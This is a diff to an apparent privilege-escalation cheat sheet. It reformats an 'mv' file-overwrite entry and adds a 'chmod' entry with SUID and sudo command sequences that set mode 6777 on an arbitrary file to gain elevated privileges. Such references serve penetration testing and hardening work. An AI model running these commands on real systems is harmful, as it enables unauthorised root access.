@@ -56,12 +56,27 @@
   echo "DATA" > $TF
   ./mv $TF $LFILE
   ```
-- Sudo:
+• Sudo:
     ```sh
   LFILE=file_to_write
   TF=$(mktemp)
   echo "DATA" > $TF
-  sudo mv $TF $LFILE
-  ```
+  sudo mv $TF $LFILE```
 
+### ♦ `chmod` :
+   ⇨ The `chmod` command can change file permissions with elevated privileges. If it has the SUID bit set, it can escalate privileges.
+
+**Commands:**
+• SUID:
+  ```sh
+  sudo install -m =xs $(which chmod) .
+
+  LFILE=file_to_change
+  ./chmod 6777 $LFILE
+  ```
+• Sudo:
+  ```sh
+  LFILE=file_to_change
+  sudo chmod 6777 $LFILE
+  ```
 
